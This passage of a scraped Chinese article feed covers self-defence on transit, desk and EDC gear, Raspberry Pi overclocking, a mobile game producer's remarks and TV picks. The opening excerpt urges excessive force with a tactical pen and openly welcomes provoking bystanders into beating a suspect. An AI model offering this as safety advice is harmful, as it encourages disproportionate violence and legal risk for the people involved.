href=\"https://sspai.com/post/60832\">武器要放在顺手就能拿到的位置</a></p>\n<p>从最初的攻击开始，每一次攻击都要以充分（甚至稍微过分）的武力等级展开，而且无论是否得手都不停止，直到对方后退、与我拉开距离。我们在不法分子面前一定是显得较为弱势的一方，不太可能「误杀」，所以只要出手，就万毋留情。即使拉开距离、停止攻击，也要随时做好继续战斗的准备。</p>\n<p>不必过于担心对方恼羞成怒、向你继续升级武力。我们处在公共场合，有众多旁观者在场。在攻击之余一定要伴随义正言辞的语言喝止，清楚陈述对方的行为，并附上公开的道德贬损和侮辱。</p>\n<p>如果只说「往哪摸呢」，对方通常会反驳，你们可能会陷入无谓的争吵。单纯试图用手机拍摄对方的脸，对方可能会来抢夺手机。这都不是好的斗争策略。一边直接反击、造成其疼痛，一边明确地公开羞辱、贬低，有助于打击对方的气势，也让旁观者在心理上感觉到自己较不法分子「高人一等」。在这种心态的影响下，不法分子若继续嘴硬或攻击你，就更容易激起众怒、遭到围殴——这正是我们喜闻乐见甚至愿意促成的结果。</p>\n<p>上述反应策略同样适用于公交车和电梯，不过后两者的运行环境不同，在做出反击前务必优先确保自己能站稳。如果是偷拍而非猥亵呢？只要能顺利将对方扭送，TA 手机里的照片就是罪证，警察在取证后会帮你删除。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/18/821949652b57f51f698a9a6786e4bc4e.jpeg\"><figcaption>前不久刚发生在深圳的案例，值得借鉴</figcaption></figure><p>按照国内的现行法律，不法分子一旦被抓获，至少会被处以行政拘留，并以警方通报的形式留下公开记录。如果 TA 有正式工作，那么几乎必然面临开除。第一时间反应最大化，合法地将事情闹大，促成上述两点结果，这就是笔者建议的第三条对策。</p>\n<h2>题外话：奥妙在炼心</h2>\n<p>看到刚才的对策之三，有人可能只顾着看笔者拍摄的动图，并且试图模仿笔者的动作。然而这并非笔者想要强调的重点。用战术笔扎对方的手臂，肘击对方的肋骨，转身再试图击打对方的下巴，然后顺势转向面对对手……这些动作都非常基础，经过几个月到一年的业余训练就能轻松掌握。</p>\n<p>但，掌握这些「动作」是一回事，在真正需要的时候能够且敢于将它们用出来则是另一回事。还有一些人，甚至不「知道」在这个时候自己受到了侵犯、需要（应该）把它们用出来。……</p>\n<p>这才是真正的问题所在。</p>\n<p>「奥妙在炼心」是老师傅们挂在嘴边的一句话。具体到个人防卫的情境里，具体到作为弱者的我们（特别是体格不占优的女性），笔者认为「心」首先意味着三种心理品质：<strong>攻击性（Aggression）、勇气（Courage）和决心（Determination）</strong>。这也是 IKMF（国际马伽术联盟）的教官们始终倡导的「战士之心」。</p>\n<p>在上一篇文章的后面，有读者回复，「我可能是那种即使被跟随，还会回头问对方是否需要帮助的人。」笔者在做心理咨询时还遇到过更严重的状况，例如「每次被人冒犯了，都会先想想是不是自己的错。」也许来自社会文化环境的恶劣熏陶，也许来自父母和老师的错误教育，总之，是与「战士之心」背道而驰。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/18/55208b41e9dfedfe202954e669e8f8eb.jpeg\"><figcaption>不要想「光天化日之下怎么会这样」，因为此时此刻的世界就是这样</figcaption></figure><p>热爱和平、反对冲突，是一个不坏的初衷。但坏人坏事客观上存在，客观上有概率发生在我们头上。如果在危险和冲突已经降临的时候仍然拒绝直面、假装看不见，就会毫无必要地沦为受害者，而不会有任何一点好处。</p>\n<p>这就引出了「心」的另外一层含义，也即「安全意识」。承认自己是凡人，承认危险有可能发生在自己身上，承认自己对自己负有不可推卸的责任，不再将安全单纯寄托在「对他人善意那全然的、 不切实际的信任」上。</p>\n<p>此所谓 Si vis pacem, para bellum（若要和平，必须备战）。</p>\n<p>又可说，天下虽安，忘战必危。</p>\n<p><i>注：作者系 IKMF（国际马伽术联盟）中国区个人防卫教官，Graduate 3 级别，并有 Uno-Mas Kali MMA 所颁菲律宾武术初级教练资质。正在计划参加 IKMF 的 Stay Away（女性防卫教官）专项培训。</i></p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67317"},{"title":"我的桌面、EDC 和日常生活，都用 Notion 梳理和记录","date":"2021-06-26 03:28:20","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>大家好，我是一名北漂五年的互联网运营，也非常喜欢数码产品。</p>\n<p>我对文字充满着强迫症，我会手动在中英文间敲下空格、在意大小写的规范，立志做一名「的地得」警察，甚至为每一个条目匹配最合适的 emoji 形象。</p>\n<p>在很多人眼中这是非常浪费时间的行为，但对我来说，把所有事情整理清楚反而能够更加平静，更加专注。</p>\n<p>最近购买了搭载 M1 芯片的 MacBook 和 iPad，也借此对 EDC &amp; 桌面清单做了更新。</p>\n<p>在少数派潜水很久，决定做一次分享。包括我在家用的、出门带的各种设备，以及日常信息整理方法，还有兜兜转转喜欢数码产品这么多年自己的一些感悟。</p>\n<h2>🖥 <strong>桌面 —— 完整的「生产力」平台</strong>\n</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/7f86c84ac771669e77205a126e51ddce.jpg\"></figure><p>这是我的桌面。</p>\n<p>当我们坐在桌前，生产力就不再是某个单一的设备，而是所有硬件、软件彼此连接配合之后，带来的效率的提升。</p>\n<p>完成这篇稿件时，我使用「随航」功能，通过 iPad 屏幕查看大纲；而它上一秒可能还是「音乐中控台」或者只是呈现今天的日历和天气。</p>\n<p>我可以随便朝着哪个方向说出「嘿！Siri！播放一些轻音乐」来唤醒 HomePod，或者使用雷电 3 拓展坞在 Mac mini、MacBook、iPad 设备中即插即拔，扩展屏幕。</p>\n<p>这大概是我对「桌面生产力」的理解，各司其职、相互配合、恰到好处。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/daf4747e55c162514d508d8597f8247b.png\"></figure><p>这是我的桌面设备清单。</p>\n<p>我不想在文章中过多赘述每个设备的性能跑分或使用体验，只想分享一些真正提高了生产力的搭配和方法。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/3a7d632b2ec71bdc4fc1346656271aaf.jpg\"></figure><p><strong>首先</strong>，是这张 1.6 米长、0.8 米深的桌面，足够大的面积让我可以合理地对物品进行摆放。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/a3f0f25dd72247e0fd27838f5609930f.jpg\"></figure><p>配合显示器支架臂，不仅可以灵活调整屏幕角度，也省出了屏幕下方的空间。最关键的是电源、数据线缆可以隐藏在支架中，很大程度上解决了走线的问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/162fa4a15465e3c6409ba92879a70432.JPG\"></figure><p>E4 桌腿可以在 580mm 至 1230mm 的高度中快速平稳升降，全部设备的电源线均藏在桌面下方。</p>\n<p>这样的整体设置构成了「桌面生产力」的基本平台。</p>\n<p><strong>其次</strong>，是尽可能实现的「无线模式」。</p>\n<ul>\n<li>使用三合一充电板完成对手机、手表、耳机的充电；</li>\n<li>使用妙控系列三件套摆脱线缆对键鼠的限制；</li>\n<li>使用雷电拓展坞作为多设备信号数据传输的「交换中心」；</li>\n<li>使用无线耳机、音响实现音频输出；</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/3664990da263232a5151f57bffa7858a.jpg\"></figure><p>桌面设备的无线化在很大程度上提高了使用时的效率和感受。</p>\n<p><strong>最后</strong>，是形成个人「随手记录」的习惯，并找到最合适的方法。</p>\n<p>对我来说，坐在桌前时，免不了会有大量信息输入。</p>\n<ul>\n<li>看到新的种草小物件</li>\n<li>忽然有了新的创作灵感</li>\n<li>想起了一些很重要的待办事项</li>\n</ul>\n<p>对于这些内容，我建议大家把他们从「脑海中一闪而过」变成「用合适的方法随手记下」。</p>\n<p>比如使用 Apple 自带的备忘录，或者印象笔记、flomo 等软件。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/80ac1c3e2678df0bff9e7afacd42e9b6.jpeg\"></figure><p>我会在 Notion 中建立一个叫做「Dashboard」的页面，这里包括我每周要做的事情、想买的东西，以及每天提醒自己的鸡汤忠告 🙃</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/a560b251b458804868ff3decc715d644.png\"></figure><p>以上，我就可以坐在这里，或者站在这里，完成工作或者仅仅是休闲娱乐，而所有的一切，都在掌控之中，可以说是极其善良守序的画面了。</p>\n<h2><strong>🎒 EDC —— 功能和重量一样重要</strong></h2>\n<p>这是我的 EDC 👇🏻</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/4f0647d444e7f64a1e6430ddb9cd5895.jpg\"></figure><p>这也是我的 EDC 👇🏻</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/67042f3d2c4e29570d3e42bc62f186d4.JPG\"></figure><p>先实名赞美一下 incase 的双肩包真的非常非常优秀。</p>\n<p>口袋分配合理、容量令人惊喜、电脑位自带绒布减少磨损，小风小雨完全防得住。</p>\n<p>很长一段时间，我也倾向于把这些东西都带在身上，觉得充满了随时随地可生产力的安全感。</p>\n<p>但其实慢慢就会觉得，日常上下班通勤，重量和功能一样重要。很多时候我只是为了「全」而「全都带着」，反而增加了无谓的负担。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/6a8616440edc87ef25e49e017a4abea3.jpg\"></figure><p>所以东西可以齐全，但具体携带哪些，还是看实际的场景和需求。</p>\n<ul>\n<li>上班通勤：iPhone、Apple Watch、AirPods Pro、卡包</li>\n<li>日常咖啡馆：在上班通勤的基础上增加 iPad 或 MacBook，以及口袋笔记本</li>\n<li>短途差旅：SONY WH-1000X M3 头戴式降噪耳机必不可少</li>\n<li>出门游玩：DJI OSMO Pocket II 和 100w 3C1A GaN 充电器都可以稳稳放在 PeakDesign 收纳包中</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/15010ba9cb51a603ff0e1e8510fadacd.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/9a854bc7a37709b62ed82549d660839b.jpg\"></figure><p>重点安利一下这款「巅峰设计」收纳包。拥有 21 个口袋，整体是防水的材质。</p>\n<p>无论是数据线、卡、票据，还是转换器、充电头、文具，都能集中收纳。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/3523c62bb0e128128f6a541d9eb4e71c.jpg\"></figure><h2><strong>🗂 Notion —— 我的人生行动指南</strong></h2>\n<p>前面也有提到，我会使用 Notion 对要做的事情、想买的东西做日常记录。</p>\n<p>除此之外，也用它记录了密码、KTV 保留曲目、差旅物品清单甚至每个版本的简历。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/649a4fd2e0952fb7f5d2dd15d5902478.png\"></figure><p>最近两年在很努力的断舍离，极少购入新的衣服鞋子，数码产品也坚持「入一出一」的原则<sup class=\"ss-footnote\" href=\"\" title=\"在控制不住的时候会切换「开心第一」的原则。\" footnote-id=\"1\">1</sup>。</p>\n<p>北漂第五年，搬过五次家，处理掉了很多旧衣物、毛绒玩具、盲盒和乐高。</p>\n<p>定期分门别类整理房间里的每一个物品。坚持记账 1340 天，为 Notion 贡献 DAU 一年零三个月，每年写一篇总结，做复盘和感慨。</p>\n<p>这好像也是一种强迫症 🤔</p>\n<p>但它确实让我时时刻刻都更清楚，我是谁，我在哪里，我应该干什么，我已经拥有什么，我还想要些什么。</p>\n<p>当然，这只是我自己的习惯，也只是对自己的要求。它并不影响，也不会限制我融入这个可爱的世界，和家人、朋友、同事开心地相处。</p>\n<h2><strong>📌 写在最后</strong></h2>\n<p>大学时期从魅族 M9、HTC Butterfly、Surface RT 开始关注和喜欢数码产品。</p>\n<p>那时候手机市场百家争鸣、异彩纷呈。</p>\n<p>直到现在，魅族成为二线品牌，HTC 已然落幕，每天人来人往地铁通勤，我和刘海屏们、摄像头军备竞赛们一道，变得更加普通和难以分辨。</p>\n<p>被大势和焦虑推着往前走，要学习这本《运营之光》才能月薪三万，要了解这门 SQL 入门，才能躲掉中年危机。</p>\n<p>我们不断在做新的事情，似乎上了新的台阶，但很难判断这到底是不是自己真实喜欢的东西了。</p>\n<p>好在还保留着这一点点对数码产品的喜爱，维持着信息整理的「内心秩序」，让我在每一个深夜觉得，此刻真实。</p>\n<p>感谢你看到这里 😬</p>\n<hr>\n<p> </p>\n","link":"https://sspai.com/post/67371"},{"title":"树莓派超频","date":"2021-06-25 15:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"如何评价 6 月 11 日公测的《鬼泣-巅峰之战》手游？","date":"2021-06-25 15:30:08","description":"\n<p>感谢 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/70c5673ee4e9644003f7a725c4a06a4e\" data-hash=\"70c5673ee4e9644003f7a725c4a06a4e\" data-hovercard=\"p$b$70c5673ee4e9644003f7a725c4a06a4e\">@知乎游戏</a>  的邀请</p>\n<blockquote>前言：大家好，我是《鬼泣-巅峰之战》（后续简称鬼泣手游）的制作人肥猫。项目自立项制作到现在已经过了3年时光，团队也从最初的100人扩展到现在的300多人，着实感慨颇多。近期也是终于开放了全平台公测，能够顺利将这部作品呈现给大家，我们内心是欣喜的。在此首先感谢各位对游戏始终如一的支持和喜爱，也感谢团队中所有人的辛苦付出，通过知乎这个平台，我也想和诸位聊一聊我对这款游戏的心里话。</blockquote>\n<p> 作为鬼泣手游的制作人，如何评价自己的游戏。我当然很想给他打100分，因为我了解这开发3年以来，游戏之中所包含的辛苦与努力。从无到有，优化调整，追进度改bug，就像呵护自己的孩子一般，从一次又一次的测试中见证它的成长。同时我也知道，它并不完美，但是我们希望通过自己的努力，让它变得更好，成为手机平台动作游戏中的佼佼者。最重要的，不负期待，不负鬼泣之名。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-bc043de6428384cffbecaf76a3140b6d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"798\" data-rawheight=\"448\" data-watermark=\"watermark\" data-original-src=\"v2-bc043de6428384cffbecaf76a3140b6d\" data-watermark-src=\"v2-64b5600f0def519dea7d167744c072c6\" data-private-watermark-src=\"v2-9ed5594669c7422f86778ea2b3b87d16\"></p>\n<p> 能成功获得少年时最爱游戏的ip授权，还是和CAPCOM这种动作游戏领衔的公司合作，真的能让人感到热血澎湃。同时我也问了自己一个问题，“把鬼泣做成手游，应该做成什么样子？”还记得第一次测试之时，那一版的鬼泣手游还不能飞起来。我们靠着一腔热血做出来的游戏，就动作游戏而言它是合格的，但是唯独不是鬼泣，不能空中连段算什么鬼泣？于是我们进行了推翻重做，才有了现在的“皇牌空战”。</p>\n<p>鬼泣手游还不够完美，作为一个游戏行业从业者而言，它需要打磨的点还有很多。公测以来，我们收到了许多玩家的留言反馈。有的沉着冷静，有的言辞激烈，即便是做好了面对这一切的心理准备，依旧感受到我们需要做的还很多。无论是什么样的留言，都是来自鬼泣手游和这个作品系列的热情，目的都是为了让游戏变得更好。所以在此想说一句“请轻喷”，当然建议我们都会评估，还请给我们一些时间，去解决那些让大家感受不佳的问题。</p>\n<p><br></p>\n<p>《鬼泣-巅峰之战》的诞生，我们到底做了哪些努力，借此机会也想和大家分享一下。</p>\n<p>鬼泣系列是一款主机游戏，要把这款大作搬到手机平台上，势必要根据实际情况进行取舍，还要面对许多突破式的挑战。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-adac55f6a8d4cdd4e67e7d8695ad423b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2250\" data-rawheight=\"1500\" data-watermark=\"watermark\" data-original-src=\"v2-adac55f6a8d4cdd4e67e7d8695ad423b\" data-watermark-src=\"v2-d1a6893670e81da0bd2facf76d4c6e99\" data-private-watermark-src=\"v2-f7d48bd0f6d52006342aa2565c718e37\"></p>\n<p> 对比同类型，鬼泣手游中一个角色的内容是非常的丰富，而且就技能而言，只要玩家获得了一类武器的某一个，那么武器所对应的所有技能就都可以去学习了，也可以通过各种武器的自由组合去实现更为华丽的操作，创造属于自己的连招，这一点是非常酷的。</p>\n<p>说实在话，单单就说还原《鬼泣》的战斗手感其实都是一个巨大的挑战，更不用说JC机制、踩怪弹反等特色战斗。市面上大部分手机动作游戏是没有跳跃的，而有极少数有跳跃的也没有《鬼泣》那样的踩怪JC机制。可以说在对标《鬼泣》原作操作的制作标准下，实际开发起来非常困难，涉及到很多的模块，我们需要不断的去优化调整。</p>\n<p>鬼泣手游并非是直接移植，我们在CAPCOM花了20年构筑的鬼泣大世界中进行填补，让手游的故事能够填补鬼泣世界观的空缺，也为粉丝们解答了许多设定上的未解之谜，比如“鬼泣3后维吉尔和但丁又发生了怎样的故事？”让我们的游戏真正成为鬼泣系列的新作。</p>\n<p>还有一点要说的是玩家体验方面，手游的推出让许多并不了解鬼泣系列的玩家到来，而游戏本身属于硬核向，所以在平衡新老用户的体验上做了很多功课。平衡新老用户主要是在保持机制的前提下做好数值的平衡，让老玩家能够玩的尽兴，同时新玩家也能体会到游戏的快乐。</p>\n<p>比如说我们注意到很多新用户在战斗时并不会按节奏和按键顺序来按，而是快速狂点一个按键，还有就是一直狂按输出，直到怪物抬手要攻击时又狂按闪避。我们按硬核动作游戏方式做的操作设计，反倒成了新的手游玩家体验不好的地方。所以我们在公测版本中修改了指令输入机制，还按照玩家的操作习惯把一些以前需要玩家自己学的技能放到初始技能里。这样新玩家在狂按一个键的时候也能按出实用的技能，在快要被揍的时候基本能及时闪开。</p>\n<p>未来，我们将陆续开放更多玩家之间有交互的玩法，更高画质的PC版也会上线。目前主线剧情、角色较少、游戏玩法较少、关卡难度偏低、新武器推出较慢等问题，我们一直都会关注，请相信我们会给各位一个满意的答案。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c4ef4f204ed9371ea9eb4bafb782f6ca_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2208\" data-rawheight=\"1242\" data-watermark=\"watermark\" data-original-src=\"v2-c4ef4f204ed9371ea9eb4bafb782f6ca\" data-watermark-src=\"v2-7661d4834c34139c2649fa93f5b5e7f7\" data-private-watermark-src=\"v2-e6e94e96de396d3242c7d754645ab9bf\"></p>\n<p> 最后，再次感谢各位对于《鬼泣-巅峰之战》手游的支持，希望大家都能拥有一段热血沸腾的猎魔旅程。恶魔猎人，永不止步！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/fei-mao-35-76?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">肥猫</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/464092167/answer/1960966612?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">86 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/296672609?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如果出一款鬼泣手游，你对它有什么期待？</a><br><a href=\"http://www.zhihu.com/question/420899122?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">怪物猎人和鬼泣这种游戏在哪个软件下载？</a><br>\n","link":"http://www.zhihu.com/question/464092167/answer/1960966612?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"本周看什么丨最近值得一看的 8 部作品","date":"2021-06-25 10:20:28","description":"\n<h2>TL;DR</h2>\n<ul>\n<li>近期佳作推荐：[韩剧] 机智医生生活 第二季、[美剧] 瑞克和莫蒂 第五季、[日剧] 全裸导演 第二季、[真人秀] 我买了一个农场、[港剧] 刑侦日记、[台剧] 第三布局 尘沙惑、[电影] 夏日友晴天、[纪录片] 你看不见的我</li>\n<li>几则精彩预告：漫威新片《尚气与十环传奇》发布全新中字预告、全智贤主演《王国：北方的阿信》7 月 23 日上线 Netflix、Netflix 约会类真人秀《性感野兽》7 月 21 日开播、新冠肺炎疫情防控改编电影《中国医生》发布预告，官宣定档 7 月 9 日</li>\n<li>几则影视资讯：刘德华确认出演《流浪地球 2》、罗泓轸编剧并担任制片人的新片《灵媒》发布海报、《性爱自修室》第三季 9 月 17 日上线 Netflix、《美国恐怖故事集》7 月 15 日开播、Hulu 正式宣布续订《外星也难民》第四季</li>\n</ul>\n<h2><strong>👀 N 部作品推荐</strong></h2>\n<p>根据读者反馈，如果推荐语涉及剧透（对故事核心、暗线、伏笔、结局等关键要素的透露），我们会在对应作品的标题前增加 🔦 的 Emoji。</p>\n<p>如有其他建议也欢迎在评论区提出，感谢大家对「看什么」栏目的喜爱和支持。</p>\n<h3>[韩剧] 机智医生生活 第二季</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/572aeb7b1da6bd846f7ca7c773688b7e\"></figure><p>关键词：剧情</p>\n<p>片长：90 分钟（单集）× 12 集；<a href=\"https://movie.douban.com/subject/35049544/\">豆瓣链接</a></p>\n<blockquote><p>五人组的生活，我还可以再看五百集！</p></blockquote>\n<p>@潘誉晗：《机智医生生活》这一个系列 IP 似乎用剧集质量打脸了「续集不会比前作优秀」的魔咒。首播当天刷新了 tvN 首播电视剧的记录，豆瓣开局 9.8，一周过去之后稳定在 9.6 的好评更是给了喜欢这部剧集的观众一枚定心丸，放心看下去，还是那个五人组，还是那个熟悉的味道。</p>\n<p>第二季维持了第一季的故事，围绕着律帝医院的五位医生展开，而且人物的设定也没有大改动。看到俊完和翼俊因为饼干打起来的时候，那种熟悉的感觉让观众在感到好笑的时候也倍感心安，就是这个熟悉的味道。胸外科的金俊完、小儿科的安正源、肝胆胰外科的李翼俊、妇产科医生的杨硕亨、还有五人组金花神经外科蔡颂和，他们一直都在。</p>\n<p>这样性格特征鲜明的人物设定很棒，已经相识二十年的他们自然不算年轻，但是四十岁依然活得很漂亮。他们不是都市小说中会塑造的那种完美人设，有缺点，有不足，比如毒舌，比如妈宝，比如伪装成男子汉的坚强，可正是因为这样的不完美，他们变成了最好的五人组。他们认真工作，努力恋爱，拥有美好的友谊，还有着充满回忆的一支乐队，每一集都聚在一起唱首歌，每一集依旧还是温暖地治愈。</p>\n<h3>[美剧] 瑞克和莫蒂 第五季</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/e4d5e9420accd191eb4db3cbfcf4c830\"></figure><p>关键词：喜剧 / 科幻 / 动画 / 冒险</p>\n<p>片长：23 分钟（单集）× 10 集 ；<a href=\"https://movie.douban.com/subject/34908206/\">豆瓣链接</a></p>\n<p>@宇宙浪费指南：没想到《瑞克和莫蒂》第五季一回归就保持了超高水准，依旧是熟悉的风格，讽刺、黄暴与黑色幽默的表面藏着关于哲学与宗教的深层思考。</p>\n<p>第一集故事的信息量大到我以为首集有 40 分钟，一条线讲述 Rick 为了世界和平与「伪海王」Nimbus 谈判，另一条线则是 Morty 被 Rick 支使着穿越时空之门取葡萄酒，从而引出关于时间和历史的构造解析。姥爷或许被削弱了，但穿越时空这条线真的妙极了，是单独拿出来可以拍一部科幻战争电影的水平。因为一场误会，Morty 被异空间的人仇视，而这种仇恨竟然催生出了一种文明，他们在恐惧与仇恨中不断成长，去思考更深层的意义，比如存在，比如时间。「我有非常多的时间，却没有答案，没有意义的时间就像是监牢，我看到了永恒的思想，或是神的思想，但我只找到了寂静」。</p>\n<p>第五季还有一个变化，就是增加了幕后的出现，给创作者一个窗口去解释这一集的构思想法，能让我们在看完后比对自己的感悟，还是很好的。</p>\n<h3>[日剧] 全裸导演 第二季</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/a594ef5a50bec080bdbcd1a0299afe9d\"></figure><p>关键词：剧情 / 喜剧 / 情色 / 传记</p>\n<p>片长：45 分钟（单集）× 8 集；<a href=\"https://movie.douban.com/subject/34796281/\">豆瓣链接</a></p>\n<blockquote><p>全裸监督上天了！</p></blockquote>\n<p>@潘誉晗：这一季的剧情发展和故事脉络是非常流畅和清晰的。本季中，村西把投资目光放在了卫星广播领域，在筹资的过程中遭到了盟友川田的反对，也因此和整个团队产生了不一样的立场和意见，他和黑田香的关系也渐渐产生了距离，还有前搭档荒井敏的出现，也在他的生活中产生了不小的影响。如果我们把第一季看作是村西透梦想的崛起，那么第二季则是这位 AV 大佬上天不成，然后随着日本 90 年代泡沫经济一起幻灭的过程。</p>\n<p>作为本剧的最终季，本季也给这个 IP 画上了一个圆满的休止符，依然大尺度，也依然什么都赶敢拍，而且每一集客串的卡司也很令人惊喜。这部基于真实事件改编的剧集，把村西透这位极富传奇色彩的「色情帝王」的起起伏伏的人生拍得相当出彩，网飞一口气放出 8 集，一口气刷完感觉很带劲也很感慨，就像村西在接受采访时回答记者的那样：「人生，就是在不断讨好别人生活。」而讨好别人，注定是不能走得长远的。</p>\n<h3>[真人秀] <strong>克拉克森的农场</strong>\n</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/39c82f9ce0ebc9dcf0f743c87cb9a280\"></figure><p>关键词：真人秀</p>\n<p>片长：60 分钟（单集）× 8 集；<a href=\"https://movie.douban.com/subject/34839005/\">豆瓣链接</a></p>\n<blockquote><p>来看英格兰陶渊明的真人版失败的「牧场物语」</p></blockquote>\n<p>@宇宙浪费指南：《克拉克森的农场》是亚马逊出品的农场经营真人秀节目，主角杰瑞米·克拉克森是在赛车领域非常有名又有个性的主持人，而在这个节目里，他是个浑身长充满笑点的暴躁老农。他试图自己管理 6000 亩的土地，然而他挑战的这一年简直是「地狱难度」：播种遇到连续降雨，一下就是八个星期；需要下雨的时候又遇上了四十年一遇的极端天气；然后就是疫情，戏剧性拉满。</p>\n<p>杰瑞米本人就更好笑，一直在「我有一个好主意」和「我真是个 